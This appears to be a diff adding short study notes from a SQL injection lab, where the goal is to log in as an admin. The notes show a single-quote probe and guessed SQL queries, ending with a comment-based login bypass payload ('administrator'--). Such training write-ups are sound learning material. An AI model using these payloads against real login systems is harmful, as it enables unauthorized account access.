@@ -1,0 +1,23 @@
+SQL Injection - Login Functionality
+
+End Goal: Perform SQLi attack and log in as the admin user
+
+Amalysis
+---------
+
+First Test : Use ' to see how the application reacts, we get error 500 so it is vulnerable
+
+Guess 1
+
+SELECT firstname FROM users where username = 'admin' and password = 'admin'
+
+SELECT firstname FROM users where username = ''' and password = 'admin' Caused error
+
+SELECT firstname FROM users where username = 'admin'--' and password = 'admin' (did not work beacause admin is not a user in the system)
+
+SELECT firstname FROM users where username = 'administrator'--' and password = 'admin' (figure out different type of names for admins in this case Administrator)
+
+
+
+
+
